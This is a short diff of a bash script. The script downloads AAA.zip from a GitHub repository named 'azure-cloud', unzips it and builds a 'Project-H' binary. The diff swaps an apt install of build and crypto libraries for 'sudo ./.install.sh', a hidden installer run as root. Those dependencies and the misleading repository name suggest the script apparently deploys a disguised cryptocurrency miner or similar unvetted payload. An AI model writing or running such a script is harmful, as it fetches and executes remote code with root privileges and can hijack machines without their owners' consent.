@@ -1,4 +1,5 @@
 #!/bin/bash
+
 export TZ=America/Sao_Paulo
 export LOCAL=$(cat $(find /home -name home.file))
 data=$(date +"%d-%m-%Y_%H:%M:%S")
@@ -9,8 +10,8 @@ if [ ! -e "AAA/build/Project-H" ]; then
       sudo rm -rf AAA
    fi
 
-   sudo apt-get update
-   sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
+   sudo ./.install.sh
+   
    wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
    unzip AAA.zip
    rm -rf AAA.zip
